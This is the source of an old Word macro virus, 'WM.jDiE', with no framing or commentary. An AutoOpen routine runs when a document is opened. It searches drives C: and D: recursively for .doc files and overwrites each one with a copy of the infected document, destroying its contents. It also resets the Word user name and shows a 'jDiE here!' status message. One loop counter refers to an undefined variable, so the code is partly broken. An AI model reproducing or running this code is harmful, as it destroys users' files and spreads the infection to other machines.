   Attribute VB_Name = "AutoOpen"

   '.---------.
   ': WM.jDiE :
   '`---------'

   Public Sub MAIN()
   Dim d
   On Error GoTo -1: On Error GoTo EndMain
   For d = Asc("C") To Asc("D")
           Troi Chr(d), Chr(d) + ":\"
   Next d
   EndMain:
   End Sub

   Private Sub Troi(d$, path$)
   Dim DirNum
   Dim i
   Dim CurDir_$
   Dim f$
   Dim c
   DirNum = WordBasic.CountDirectories(path$)
   If DirNum = -1 Then GoTo FindFile
   For i = 1 To DirNum
           CurDir_$ = WordBasic.[GetDirectory$](path$, i)
           Troi d$, path$ + CurDir_$ + "\"
   Next i
   FindFile:
   f$ = WordBasic.[Files$](path$ + "*.doc")
   c = -1
   While f$ <> ""
           c = c + 1
           f$ = WordBasic.[Files$]()
   Wend
   If c > -1 Then
           f$ = WordBasic.[Files$](path$ + "*.doc")
           WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
           For i = 1 To count_
                   f$ = WordBasic.[Files$]()
                   WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
           Next i
   End If
   WordBasic.ToolsOptionsUserInfo Name:="jDiE"
   WordBasic.PrintStatusBar "jDiE here!"
   End Sub
